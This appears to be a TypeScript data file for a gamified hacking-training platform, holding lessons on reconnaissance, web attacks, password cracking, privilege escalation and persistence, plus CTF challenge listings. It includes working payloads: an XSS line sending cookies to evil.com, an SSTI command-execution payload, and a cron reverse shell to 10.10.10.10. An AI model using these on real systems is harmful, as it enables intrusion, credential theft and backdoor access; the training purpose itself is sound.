import { CourseModule, Challenge, User } from '../types';

export const INITIAL_USER: User = {
  name: "Guest Operator",
  rank: "Script Kiddie",
  level: 1,
  xp: 150,
  completedModules: [],
  skills: {
    offensive: 20,
    defensive: 10,
    networking: 35,
    scripting: 15,
    forensics: 5,
  }
};

export const COURSES: CourseModule[] = [
  // --- RECONNAISSANCE ---
  {
    id: 'recon-101',
    title: 'Recon 01: Active Discovery',
    category: 'Red Team',
    difficulty: 'Beginner',
    description: 'Master the art of network enumeration. Learn to identify live hosts, open ports, and running services using Nmap.',
    content: `
# Network Reconnaissance Guide

Before attacking any system, you must understand its footprint. This module guides you through a standard **Active Reconnaissance** methodology targeting the server at **10.10.10.55**.

## Phase 1: Connectivity Check
First, we must verify if the target system is online and reachable from our attack box. We use ICMP packets (Ping) for this.

**Step 1:** Send 3 distinct ICMP packets to the target.
\`\`\`bash
ping -c 3 10.10.10.55
\`\`\`

## Phase 2: Port Discovery (Fast Scan)
Scanning all 65,535 ports takes time. We start with a "Fast Scan" checking the top 100 most common ports (HTTP, SSH, FTP, etc.).

**Step 2:** Execute a fast Nmap scan.
\`\`\`bash
nmap -F 10.10.10.55
\`\`\`

## Phase 3: Service Fingerprinting
Knowing port 80 is open isn't enough. Is it Apache? Nginx? What version? Vulnerabilities are version-specific.

**Step 3:** Use the \`-sV\` flag to interrogate the open ports.
\`\`\`bash
nmap -sV 10.10.10.55
\`\`\`

## Phase 4: Full System Scan
In a real engagement, you would scan all ports and look for OS details.

**Step 4:** (Optional) Comprehensive scan.
\`\`\`bash
nmap -p- -O 10.10.10.55
\`\`\`

## Mission Goal
Execute a service version scan against the target to identify the vulnerable MySQL version.
    `,
    labConfig: {
      initialOutput: "VORTEX OS v2.1. Network Interface ETH0 Up. Target IP: 10.10.10.55",
      expectedCommand: "nmap",
      successMessage: "SCAN REPORT:\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 8.2\n80/tcp  open  http        Apache 2.4\n3306/tcp open mysql       MySQL 5.5.62 (Vulnerable)",
      hint: "Run 'nmap -sV 10.10.10.55' to reveal the MySQL version."
    }
  },
  {
    id: 'recon-102',
    title: 'Recon 02: Directory Enumeration',
    category: 'Red Team',
    difficulty: 'Beginner',
    description: 'Discover hidden directories and files on web servers using Gobuster/Dirb techniques.',
    content: `
# Directory Enumeration

Web servers often host files that aren't linked from the homepage (e.g., /admin, /backup, /config). Attackers use brute-force tools to find these hidden assets by checking against wordlists.

## Tools of the Trade
- **Gobuster**: Fast, written in Go.
- **Dirb**: Classic directory buster.
- **Dirbuster**: GUI based (Java).

## The Wordlist
A wordlist is a text file containing common directory names. We will use \`common.txt\`.

## Phase 1: Basic Enumeration
We will target the web server running on **10.10.10.55**.

**Step 1:** Run Gobuster in directory mode.
\`\`\`bash
gobuster dir -u http://10.10.10.55 -w common.txt
\`\`\`

**Step 2:** Analyze the status codes.
- **200**: File exists and is accessible.
- **301**: Redirect (often to a login page).
- **403**: Forbidden (Access control exists, interesting!).

## Mission Goal
Find the hidden login panel on the target web server.
    `,
    labConfig: {
      initialOutput: "Target: http://10.10.10.55. Wordlist loaded: common.txt",
      expectedCommand: "gobuster",
      successMessage: "FOUND: /index.php (Status: 200)\nFOUND: /images (Status: 301)\nFOUND: /admin-panel (Status: 200) [Redirects to login]",
      hint: "Use 'gobuster dir -u http://10.10.10.55 -w common.txt'"
    }
  },

  // --- WEB HACKING ---
  {
    id: 'sql-injection',
    title: 'Web 01: SQL Injection (SQLi)',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Understand how SQL injection works and how to dump databases using manual techniques.',
    content: `
# SQL Injection (SQLi)

SQL injection occurs when untrusted user input is dynamically concatenated into a SQL query without sanitization. This allows an attacker to manipulate the query to access unauthorized data.

## The Theory
Imagine a backend query:
\`SELECT * FROM users WHERE id = '$input';\`

If we input \`1 OR 1=1\`, the query becomes:
\`SELECT * FROM users WHERE id = '1 OR 1=1';\`

Since \`1=1\` is always true, the database returns **all** users.

## Automated Exploitation: SQLMap
SQLMap is the standard tool for detecting and exploiting SQLi flaws.

## Phase 1: Identification
We suspect the parameter \`id\` is vulnerable on **http://target.com/login.php?id=1**.

**Step 1:** Test the URL with SQLMap.
\`\`\`bash
sqlmap -u "http://target.com/login.php?id=1" --batch
\`\`\`

## Phase 2: Enumeration
Once confirmed, we want to know what databases exist.

**Step 2:** List databases.
\`\`\`bash
sqlmap -u "http://target.com/login.php?id=1" --dbs
\`\`\`

## Phase 3: Exfiltration
We see a database named \`users\`. Let's dump the data.

**Step 3:** Dump the database.
\`\`\`bash
sqlmap -u "http://target.com/login.php?id=1" --dump
\`\`\`

## Mission Goal
Use SQLMap to dump the user credentials from the vulnerable endpoint.
    `,
    labConfig: {
      initialOutput: "Vulnerable endpoint detected: http://target.com/login.php?id=1",
      expectedCommand: "sqlmap",
      successMessage: "[*] Fetching entries for table 'users'...\nID: 1, USER: 'admin', PASS: 'sup3rs3cr3t'\nID: 2, USER: 'guest', PASS: 'guest'",
      hint: "Try 'sqlmap -u http://target.com/login.php?id=1 --dump'"
    }
  },
  {
    id: 'xss-basics',
    title: 'Web 02: Cross-Site Scripting (XSS)',
    category: 'Red Team',
    difficulty: 'Beginner',
    description: 'Inject malicious scripts into web pages to steal cookies and session tokens.',
    content: `
# Cross-Site Scripting (XSS)

XSS allows attackers to execute arbitrary JavaScript in the victim's browser. This is often used to steal session cookies, allowing account takeover.

## Types of XSS
1. **Reflected**: Malicious script is part of the request (e.g., URL parameter).
2. **Stored**: Script is saved on the server (e.g., comment section).
3. **DOM**: Vulnerability in client-side code.

## The Proof of Concept (PoC)
The classic test is to pop an alert box. If you see the alert, the app is vulnerable.

**Payload:**
\`\`\`html
<script>alert(1)</script>
\`\`\`

## Cookie Stealing
A real attacker sends cookies to their server:
\`\`\`html
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>
\`\`\`

## Mission Goal
You have an input field that reflects text back to you. Inject a script to trigger an alert.
    `,
    labConfig: {
      initialOutput: "Browser Simulation Loaded.\nInput Field Detected: <input name='search' />",
      expectedCommand: "<script>",
      successMessage: "ALERT TRIGGERED: '1'. Vulnerability Confirmed.\nCookie: session_id=abc123xyz",
      hint: "Type '<script>alert(1)</script>' to test vulnerability."
    }
  },
  {
    id: 'web-lfi',
    title: 'Web 03: Local File Inclusion (LFI)',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Exploit poor input validation to read sensitive files from the server.',
    content: `
# Local File Inclusion (LFI)

LFI vulnerabilities allow an attacker to read files on the server by manipulating input parameters. This often happens in PHP applications using \`include()\`.

## Directory Traversal
If a URL looks like \`view.php?page=about.html\`, the backend might use:
\`include($_GET['page']);\`

An attacker can use \`../\` (dot-dot-slash) sequences to move up directories out of the web root.

## Common Targets
- **/etc/passwd**: User list on Linux.
- **/var/log/apache2/access.log**: Log poisoning.
- **C:\\Windows\\win.ini**: Windows config.

## The Attack
We want to read the password file.

**Command:**
\`\`\`bash
curl "http://vulnerable.site/index.php?view=../../../../etc/passwd"
\`\`\`

## Mission Goal
The target has a vulnerable 'view' parameter. Use curl to read **/etc/passwd**.
    `,
    labConfig: {
      initialOutput: "Target: http://vulnerable.site/index.php?view=home",
      expectedCommand: "curl",
      successMessage: "CONTENTS of /etc/passwd:\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
      hint: "Try 'curl http://vulnerable.site/index.php?view=../../../../etc/passwd'"
    }
  },
  {
    id: 'web-cmd-inject',
    title: 'Web 04: Command Injection',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Execute arbitrary OS commands on the target server.',
    content: `
# Command Injection

This occurs when an application passes unsafe user supplied data (forms, cookies, HTTP headers) to a system shell.

## The Mechanism
If a script does: \`system("ping " + user_input)\`
And we input: \`127.0.0.1; whoami\`
The system runs: \`ping 127.0.0.1; whoami\`

## Shell Operators
We can use shell operators to chain commands:
- \`;\` (Semicolon) - Run regardless of failure.
- \`|\` (Pipe) - Pipe output to next command.
- \`&&\` (AND) - Run only if first succeeds.

## Mission Goal
A "Network Connectivity Tester" tool is running. Inject the \`whoami\` command after the IP.
    `,
    labConfig: {
      initialOutput: "Ping Tool v1.0. Enter IP to ping.",
      expectedCommand: "; whoami",
      successMessage: "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n\nroot",
      hint: "Use the input simulation: '127.0.0.1; whoami'"
    }
  },
  {
    id: 'web-ssti',
    title: 'Web 05: Server-Side Template Injection',
    category: 'Red Team',
    difficulty: 'Advanced',
    description: 'Exploit template engines (Jinja2, Twig) to achieve Remote Code Execution.',
    content: `
# SSTI (Server-Side Template Injection)

Modern web apps use template engines to render HTML. If user input is embedded directly into a template, it is interpreted as code.

## Detection
Send mathematical expressions.
- Input: \`{{7*7}}\`
- Output: \`49\` (Vulnerable!)
- Output: \`{{7*7}}\` (Safe)

## Exploitation (Jinja2/Python)
We need to access the python \`os\` module to run commands.

**Payload:**
\`\`\`python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
\`\`\`

## Mission Goal
The target uses a Python Flask app with Jinja2. Inject the payload to verify RCE.
    `,
    labConfig: {
      initialOutput: "Template Engine: Jinja2. Input reflected in output.",
      expectedCommand: "{{",
      successMessage: "RCE SUCCESSFUL. Output: uid=0(root) gid=0(root) groups=0(root)",
      hint: "Try checking for evaluation: '{{7*7}}' first."
    }
  },
  {
    id: 'web-file-upload',
    title: 'Web 06: File Upload Attacks',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Bypass file upload filters to upload a web shell and gain control.',
    content: `
# File Upload Vulnerabilities

Allowing users to upload files is dangerous. If not validated properly, an attacker can upload a reverse shell (php, asp, jsp).

## Bypassing Filters
Developers often use weak blacklists.

**Technique 1: Extensions**
Rename \`.php\` to:
- \`.php5\`
- \`.phtml\`
- \`.php.jpg\` (Double extension)

**Technique 2: MIME Type Spoofing**
Intercept the request and change \`Content-Type\`:
- From: \`application/x-php\`
- To: \`image/jpeg\`

## Mission Goal
The server blocks \`.php\` files but allows images. Rename your shell to bypass the filter.
    `,
    labConfig: {
      initialOutput: "Upload Portal v2. Allowed: JPG, PNG.",
      expectedCommand: "mv shell.php shell.phtml",
      successMessage: "Upload Successful! Shell accessible at /uploads/shell.phtml",
      hint: "Rename your shell to bypass the filter: 'mv shell.php shell.phtml'"
    }
  },
  {
    id: 'web-idor',
    title: 'Web 07: Insecure Direct Object References',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Access unauthorized data by manipulating ID parameters.',
    content: `
# IDOR (Insecure Direct Object Reference)

IDOR happens when an application exposes a reference to an internal object (like a database ID) without verifying access control.

## The Scenario
You are logged in as User 505.
URL: \`http://example.com/profile?user_id=505\`

## The Attack
Simply change the ID to another number.
URL: \`http://example.com/profile?user_id=1\`

If you see User 1's profile, the app is vulnerable.

## Mission Goal
You are User 505. Use \`curl\` to access the profile of User 1 (Admin).
    `,
    labConfig: {
      initialOutput: "Logged in as User 505. Viewing /profile?id=505",
      expectedCommand: "curl",
      successMessage: "200 OK. Name: Admin. Email: admin@vortex.com. API_KEY: SUPER_SECRET",
      hint: "Change the ID parameter in your request."
    }
  },

  // --- PASSWORD ATTACKS ---
  {
    id: 'hydra-ssh',
    title: 'Cracking 01: Brute Force SSH',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Use Hydra to perform a dictionary attack against an SSH server.',
    content: `
# Online Password Attacks

When you have a login prompt but no credentials, brute force is a viable (though loud) option.

## Hydra
Hydra is a parallelized login cracker which supports numerous protocols (SSH, FTP, HTTP, RDP, etc.).

## The Syntax
\`hydra -l [user] -P [wordlist] [protocol]://[IP]\`

- \`-l\`: Single username
- \`-P\`: Path to password list
- \`-t 4\`: 4 parallel threads

## Phase 1: Attack
Target **192.168.1.100**. User is **root**. Wordlist is **rockyou.txt**.

**Command:**
\`\`\`bash
hydra -l root -P rockyou.txt ssh://192.168.1.100
\`\`\`

## Mission Goal
Launch Hydra to crack the SSH password.
    `,
    labConfig: {
      initialOutput: "Target: 192.168.1.100 (SSH). User: root. Wordlist: rockyou.txt",
      expectedCommand: "hydra",
      successMessage: "[DATA] 16 tasks, 1 server, 4 login tries (l:1/p:4), ~4 tries per task\n[22][ssh] host: 192.168.1.100   login: root   password: toor",
      hint: "Use 'hydra -l root -P rockyou.txt ssh://192.168.1.100'"
    }
  },
  {
    id: 'hashcat-basic',
    title: 'Cracking 02: Hashcat Basics',
    category: 'Red Team',
    difficulty: 'Advanced',
    description: 'Recover plaintext passwords from captured hashes using GPU acceleration.',
    content: `
# Offline Cracking with Hashcat

Hashcat is the world's fastest password cracker. It uses the power of your GPU to guess millions of passwords per second.

## Hash Modes
You must tell Hashcat what type of hash you are attacking using \`-m\`.
- **MD5**: -m 0
- **SHA-256**: -m 1400
- **NTLM**: -m 1000

## The Syntax
\`hashcat -m [mode] -a 0 [hash_file] [wordlist]\`

## Phase 1: The Attack
We have a captured MD5 hash in \`hash.txt\`.

**Command:**
\`\`\`bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
\`\`\`

## Mission Goal
Crack the hash in hash.txt.
    `,
    labConfig: {
      initialOutput: "Hashfile: hash.txt (MD5). GPU: NVIDIA RTX 3080 detected.",
      expectedCommand: "hashcat",
      successMessage: "5f4dcc3b5aa765d61d8327deb882cf99:password\nSession.........: hashcat\nStatus..........: Cracked",
      hint: "Run 'hashcat -m 0 hash.txt rockyou.txt'"
    }
  },

  // --- PRIVILEGE ESCALATION & PERSISTENCE ---
  {
    id: 'privesc-linux',
    title: 'PrivEsc 01: Linux SUID',
    category: 'Red Team',
    difficulty: 'Advanced',
    description: 'Exploit SUID binaries to elevate privileges from a low-level user to root.',
    content: `
# Linux Privilege Escalation: SUID

**SUID (Set User ID)** is a permission bit that allows a user to execute a file with the permissions of the file owner. If the owner is **root**, the program runs as root.

## Detection
Find all files with the SUID bit set.
\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`

## Exploitation
If a binary like \`python\`, \`vim\`, or \`find\` has SUID, you can break out.

**Python Exploit:**
\`\`\`bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
\`\`\`

## Mission Goal
Identify the SUID binary and use it to gain a root shell.
    `,
    labConfig: {
      initialOutput: "user@vortex-box:~$",
      expectedCommand: "find / -perm -4000",
      successMessage: "/usr/bin/python3 is SUID root.\nExploit: python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n# whoami\nroot",
      hint: "Search for SUID files: 'find / -perm -4000 2>/dev/null'"
    }
  },
  {
    id: 'linux-persist',
    title: 'Persistence 01: Linux Cron Jobs',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Maintain access to a compromised Linux host using scheduled tasks.',
    content: `
# Linux Persistence

Once you compromise a machine, you want to maintain access (Persistence) even if the computer restarts.

## Cron Jobs
Cron is the task scheduler for Linux. We can add a job that runs our Reverse Shell every minute.

## The Payload
This command runs a reverse shell to 10.10.10.10 on port 4444.
\`bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\`

## Establishing Persistence
We will append this job to the user's crontab.

**Step 1:** Echo the job into the cron spool.
\`\`\`bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" >> /var/spool/cron/root
\`\`\`

## Mission Goal
Add a malicious entry to the cron table to secure your access.
    `,
    labConfig: {
      initialOutput: "root@target:~#",
      expectedCommand: "echo",
      successMessage: "Persistence established. Backdoor will execute every minute.",
      hint: "Use echo to append to /var/spool/cron/root"
    }
  },
  {
    id: 'windows-persist',
    title: 'Persistence 02: Windows Registry',
    category: 'Red Team',
    difficulty: 'Advanced',
    description: 'Use the Windows Registry "Run" keys to execute malware on startup.',
    content: `
# Windows Persistence

The Registry contains keys that launch programs automatically when a user logs in.

## Key Locations
1. **HKCU (Current User)**: \`Software\\Microsoft\\Windows\\CurrentVersion\\Run\`
2. **HKLM (Local Machine)**: \`Software\\Microsoft\\Windows\\CurrentVersion\\Run\`

## The Command
We use the \`reg\` command line tool.

**Syntax:**
\`reg add [Key] /v [ValueName] /t REG_SZ /d [PathToMalware]\`

## Mission Goal
Add a registry value named 'Updater' pointing to 'C:\\temp\\backdoor.exe'.
    `,
    labConfig: {
      initialOutput: "PS C:\\Users\\Admin>",
      expectedCommand: "reg add",
      successMessage: "The operation completed successfully. Malware set to auto-start.",
      hint: "Use 'reg add HKCU... /v Updater /t REG_SZ /d ...'"
    }
  },

  // --- SYSTEM HACKING ---
  {
    id: 'buffer-overflow-1',
    title: 'Binary 01: Stack Buffer Overflow',
    category: 'Red Team',
    difficulty: 'Expert',
    description: 'Understand the stack memory layout and overwrite the EIP register.',
    content: `
# Stack Buffer Overflow

A buffer overflow occurs when a program writes more data to a buffer than it was allocated for. This data can overwrite adjacent memory, including the **Instruction Pointer (EIP)**, which controls what code the CPU executes next.

## The Process
1. **Fuzzing**: Send large data to crash the app.
2. **Offset**: Find exactly where EIP is overwritten.
3. **Overwrite**: Point EIP to your shellcode.

## Phase 1: Fuzzing
The server listens on port 9999. Let's send 500 'A's to see if it crashes.

**Python Script:**
\`\`\`python
python3 -c "print('A'*500)"
\`\`\`

## Mission Goal
Crash the vulnerable server by sending an oversized payload.
    `,
    labConfig: {
      initialOutput: "Vulnerable Server v1.0 listening on port 9999...",
      expectedCommand: "python3 -c \"print('A'*500)\"",
      successMessage: "Segmentation fault (core dumped). EIP: 0x41414141. You control the instruction pointer!",
      hint: "Pipe python output to the binary: python3 -c \"print('A'*500)\" | ./vuln"
    }
  },
  {
    id: 'buffer-overflow-2',
    title: 'Binary 02: Return to Libc',
    category: 'Red Team',
    difficulty: 'Expert',
    description: 'Bypass the NX (No-Execute) bit by reusing existing code in libc.',
    content: `
# Ret2Libc

Modern systems have the **NX Bit** (No-Execute), which prevents code from running on the stack. Standard buffer overflows won't work.

## The Solution
Instead of injecting code, we jump to code that is already there: the standard C library (**libc**).
Specifically, we jump to the \`system()\` function.

## Prerequisites
We need to find the memory address of:
1. \`system()\`
2. \`exit()\`
3. \`"/bin/sh"\`

## Debugging
We use GDB (GNU Debugger).

**Command:**
\`\`\`bash
print system
\`\`\`

## Mission Goal
Use GDB to find the address of the system function.
    `,
    labConfig: {
      initialOutput: "gdb-peda$ ",
      expectedCommand: "print system",
      successMessage: "$1 = {<text variable, no debug info>} 0xf7e4c060 <system>",
      hint: "Use gdb command 'print system'"
    }
  },
  {
    id: 'metasploit-basics',
    title: 'Exploit 01: Metasploit Framework',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Learn the "Point and Click" framework of hacking.',
    content: `
# Metasploit Framework (MSF)

MSF is the Swiss Army knife of exploitation. It contains thousands of ready-to-use exploits.

## Core Terminology
- **Exploit**: Code that takes advantage of a flaw.
- **Payload**: Code that runs after exploitation (e.g., Reverse Shell).
- **Module**: A piece of software in MSF.

## Usage Guide
1. **Search**: \`search type:exploit platform:windows smb\`
2. **Select**: \`use exploit/windows/smb/ms08_067_netapi\`
3. **Configure**: \`set RHOSTS 192.168.1.5\`
4. **Fire**: \`exploit\`

## Mission Goal
The target (192.168.1.5) is vulnerable to MS08-067. Launch the exploit.
    `,
    labConfig: {
      initialOutput: "msf6 >",
      expectedCommand: "exploit",
      successMessage: "[+] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.5:445)",
      hint: "Type 'exploit' after setting up (simulated environment)."
    }
  },
  {
    id: 'docker-breakout',
    title: 'Cloud 01: Docker Breakout',
    category: 'Red Team',
    difficulty: 'Expert',
    description: 'Escape a containerized environment to access the host system.',
    content: `
# Docker Breakouts

Containers are isolated, but they share the host kernel. If misconfigured, you can break out.

## The Vulnerability: Mounted Socket
Developers sometimes mount the Docker socket (\`/var/run/docker.sock\`) inside a container to allow it to create other containers (Docker-in-Docker).

**Risk:** If you have access to the socket, you are effectively **root** on the host.

## The Exploit
We can use the socket to launch a new container that mounts the host's root filesystem.

**Command:**
\`\`\`bash
docker -H unix:///run/docker.sock ps
\`\`\`

## Mission Goal
You are inside a container. Check if you can list the host's containers using the mounted socket.
    `,
    labConfig: {
      initialOutput: "root@container:/#",
      expectedCommand: "docker -H unix:///run/docker.sock ps",
      successMessage: "CONTAINER ID   IMAGE     COMMAND\n89a8sd7f98   ubuntu    '/bin/bash'",
      hint: "Use the docker CLI with the mounted socket."
    }
  },
  {
    id: 'reverse-shell',
    title: 'Shells 01: Reverse Shells',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Understand the difference between Bind and Reverse shells and how to catch them.',
    content: `
# Reverse Shells

When you exploit a target, you need a way to control it.
- **Bind Shell**: Attacker connects to Target. (Blocked by Firewalls).
- **Reverse Shell**: Target connects to Attacker. (Allowed by Firewalls).

## The Listener
Before the target connects back, you must be listening. We use Netcat.

**Command:**
\`\`\`bash
nc -lvnp 1337
\`\`\`
- **-l**: Listen
- **-v**: Verbose
- **-n**: No DNS lookup
- **-p**: Port

## Mission Goal
Set up a Netcat listener on port 1337 to catch the incoming shell.
    `,
    labConfig: {
      initialOutput: "kali@attack-box:~$",
      expectedCommand: "nc -lvnp 1337",
      successMessage: "Listening on [0.0.0.0] (family 0, port 1337)",
      hint: "Use 'nc -lvnp 1337'"
    }
  },

  // --- REVERSE ENGINEERING ---
  {
    id: 'rev-strings',
    title: 'Reverse 01: Strings Analysis',
    category: 'Red Team',
    difficulty: 'Intermediate',
    description: 'Extract hardcoded secrets from binary files without running them.',
    content: `
# Static Analysis: Strings

The \`strings\` command is one of the most useful reverse engineering tools. It scans a binary file for printable ASCII characters.

## Use Cases
- Finding hardcoded passwords.
- Finding API keys.
- Identifying what compiler was used.
- Finding hidden messages.

## Usage
Simply run strings against the file.
\`\`\`bash
strings auth_module
\`\`\`

## Mission Goal
Analyze the **auth_module** binary to find the hardcoded password.
    `,
    labConfig: {
      initialOutput: "Binary 'auth_module' present.",
      expectedCommand: "strings auth_module",
      successMessage: "Found lines:\n...GLIBC_2.0...\nEnter Password:\nSuperSecretBackdoor123\nAccess Granted",
      hint: "Run 'strings auth_module'"
    }
  },

  // --- DEFENSIVE ---
  {
    id: 'blue-logs',
    title: 'Defensive 01: Log Analysis',
    category: 'Blue Team',
    difficulty: 'Beginner',
    description: 'Learn to spot Indicators of Compromise (IoC) in server logs.',
    content: `
# Log Analysis

Logs are the diary of a computer system. When an attack happens, the evidence is almost always in the logs.

## What to look for?
1. **Repeated failed login attempts** (Brute Force).
2. **Strange User Agents** (Scanners like Sqlmap/Nikto).
3. **Base64 encoded strings** in URL parameters.

## The Tool: Grep
We use \`grep\` to search through text files.

**Command:**
\`\`\`bash
grep "Failed password" /var/log/auth.log
\`\`\`

## Mission Goal
Analyze the auth.log file for the target machine to find failed login attempts.
    `,
    labConfig: {
      initialOutput: "Accessing /var/log/auth.log...",
      expectedCommand: "grep",
      successMessage: "THREAT DETECTED. IP 45.33.22.11 attempted 500 logins in 10 seconds.",
      hint: "Try 'grep \"Failed password\" /var/log/auth.log'"
    }
  },
  {
    id: 'blue-firewall',
    title: 'Defensive 02: IPTables Hardening',
    category: 'Blue Team',
    difficulty: 'Intermediate',
    description: 'Configure Linux firewall rules to block malicious traffic.',
    content: `
# IPTables Basics

IPTables is the standard firewall utility for Linux. It functions on chains of rules (INPUT, OUTPUT, FORWARD).

## Blocking an IP
To drop all traffic coming from a specific IP address (e.g., 1.2.3.4):

**Command:**
\`\`\`bash
iptables -A INPUT -s 1.2.3.4 -j DROP
\`\`\`
- **-A**: Append rule
- **-s**: Source IP
- **-j**: Jump to target (DROP)

## Mission Goal
Block the IP **1.2.3.4** which has been spamming our server.
    `,
    labConfig: {
      initialOutput: "Firewall Policy: ACCEPT ALL.",
      expectedCommand: "iptables -A INPUT -s 1.2.3.4 -j DROP",
      successMessage: "Rule Added. Traffic from 1.2.3.4 is now BLOCKED.",
      hint: "Use 'iptables -A INPUT -s 1.2.3.4 -j DROP'"
    }
  }
];

export const CHALLENGES: Challenge[] = [
  // --- EXISTING CHALLENGES ---
  {
    id: 'ctf-1',
    title: 'The Hidden Directory',
    category: 'Web',
    difficulty: 'Easy',
    points: 100,
    description: 'A web server is hiding a secret file. Robots usually know where not to look.',
    solved: false
  },
  {
    id: 'ctf-2',
    title: 'Weak Hash',
    category: 'Crypto',
    difficulty: 'Easy',
    points: 150,
    description: 'Decrypt this MD5 hash: 5f4dcc3b5aa765d61d8327deb882cf99',
    solved: false
  },
  {
    id: 'ctf-3',
    title: 'Privilege Escalation',
    category: 'System',
    difficulty: 'Hard',
    points: 500,
    description: 'You have user access. Find the SUID binary to get root.',
    solved: false
  },
  
  // --- NEW CHALLENGES ---
  {
    id: 'ctf-4',
    title: 'Base64 Madness',
    category: 'Crypto',
    difficulty: 'Easy',
    points: 50,
    description: 'Decode this string: Vk9SVEVYU0NSSVBUUyBpcyB0aGUgZnV0dXJl',
    solved: false
  },
  {
    id: 'ctf-5',
    title: 'SQL Injection Login',
    category: 'Web',
    difficulty: 'Medium',
    points: 300,
    description: 'Bypass the login form at /admin.php. The developer sanitized quotes but not comments.',
    solved: false
  },
  {
    id: 'ctf-6',
    title: 'Wireshark Analysis',
    category: 'Forensics',
    difficulty: 'Medium',
    points: 250,
    description: 'Analyze the PCAP file. Find the FTP password sent in cleartext.',
    solved: false
  },
  {
    id: 'ctf-7',
    title: 'Buffer Overflow 0x1',
    category: 'Binary',
    difficulty: 'Hard',
    points: 600,
    description: 'The program at port 1337 segfaults when you send 64 bytes. Find the offset.',
    solved: false
  },
  {
    id: 'ctf-8',
    title: 'JWT Token Tampering',
    category: 'Web',
    difficulty: 'Medium',
    points: 350,
    description: 'Change the "role": "user" to "role": "admin" in the JWT token and resign it with "none" algorithm.',
    solved: false
  },
  {
    id: 'ctf-9',
    title: 'Reverse Me',
    category: 'Reverse Eng',
    difficulty: 'Hard',
    points: 550,
    description: 'The binary compares your input against a scrambled string. Unscramble it.',
    solved: false
  },
  {
    id: 'ctf-10',
    title: 'Docker Escape',
    category: 'System',
    difficulty: 'Insane',
    points: 1000,
    description: 'You are inside a container. The docker socket is mounted. Break out to the host.',
    solved: false
  },
  {
    id: 'ctf-11',
    title: 'CSRF to Account Takeover',
    category: 'Web',
    difficulty: 'Medium',
    points: 400,
    description: 'Create an HTML page that forces the admin to change their password when they view it.',
    solved: false
  },
  {
    id: 'ctf-12',
    title: 'Steganography 101',
    category: 'Forensics',
    difficulty: 'Easy',
    points: 100,
    description: 'There is a text file hidden inside this image.jpg. Use steghide.',
    solved: false
  },
  {
    id: 'ctf-13',
    title: 'Git Exposed',
    category: 'Web',
    difficulty: 'Easy',
    points: 150,
    description: 'The developer left the .git folder exposed. Reconstruct the source code.',
    solved: false
  },
  {
    id: 'ctf-14',
    title: 'Android APK Reversing',
    category: 'Mobile',
    difficulty: 'Hard',
    points: 500,
    description: 'Decompile the APK. The flag is constructed in the MainActivity class.',
    solved: false
  },
  {
    id: 'ctf-15',
    title: 'Kerberoasting',
    category: 'Active Directory',
    difficulty: 'Insane',
    points: 800,
    description: 'Request a TGS for the SQL service and crack the hash offline.',
    solved: false
  },
  // --- BATCH 2 CHALLENGES ---
  {
    id: 'ctf-16',
    title: 'Logic Flaw: Negative Cost',
    category: 'Web',
    difficulty: 'Easy',
    points: 200,
    description: 'The shop lets you buy items with quantity -1. Get the premium membership for free.',
    solved: false
  },
  {
    id: 'ctf-17',
    title: 'XXE External Entity',
    category: 'Web',
    difficulty: 'Medium',
    points: 300,
    description: 'The XML parser parses external entities. Read /etc/hostname from the server.',
    solved: false
  },
  {
    id: 'ctf-18',
    title: 'Python Jail Escape',
    category: 'Misc',
    difficulty: 'Hard',
    points: 600,
    description: 'You are in a restricted python shell. `import` and `eval` are banned. Read the flag.',
    solved: false
  },
  {
    id: 'ctf-19',
    title: 'DLL Hijacking',
    category: 'System',
    difficulty: 'Hard',
    points: 500,
    description: 'The application loads a missing DLL from the current directory. Compile a malicious one.',
    solved: false
  },
  {
    id: 'ctf-20',
    title: 'Linux Capabilities',
    category: 'System',
    difficulty: 'Medium',
    points: 400,
    description: 'The `tar` binary has cap_dac_read_search capability. Use it to read /shadow.',
    solved: false
  },
  {
    id: 'ctf-21',
    title: 'Smart Contract Re-entrancy',
    category: 'Web3',
    difficulty: 'Insane',
    points: 1000,
    description: 'Drain the funds from the solidity contract using a recursive fallback function.',
    solved: false
  },
  {
    id: 'ctf-22',
    title: 'DNS Exfiltration',
    category: 'Forensics',
    difficulty: 'Medium',
    points: 350,
    description: 'The attacker stole data via DNS queries. Reconstruct the file from the PCAP.',
    solved: false
  },
  {
    id: 'ctf-23',
    title: 'Memory Dump Analysis',
    category: 'Forensics',
    difficulty: 'Hard',
    points: 600,
    description: 'Use Volatility to find the hidden process in this Windows memory dump.',
    solved: false
  },
  {
    id: 'ctf-24',
    title: 'Ransomware Decryptor',
    category: 'Reverse Eng',
    difficulty: 'Insane',
    points: 900,
    description: 'The malware uses a static XOR key. Reverse the binary and write a decryptor.',
    solved: false
  },
  {
    id: 'ctf-25',
    title: 'GraphQL Introspection',
    category: 'Web',
    difficulty: 'Medium',
    points: 300,
    description: 'Introspection is enabled. Map the schema and find the hidden "superAdmin" mutation.',
    solved: false
  }
];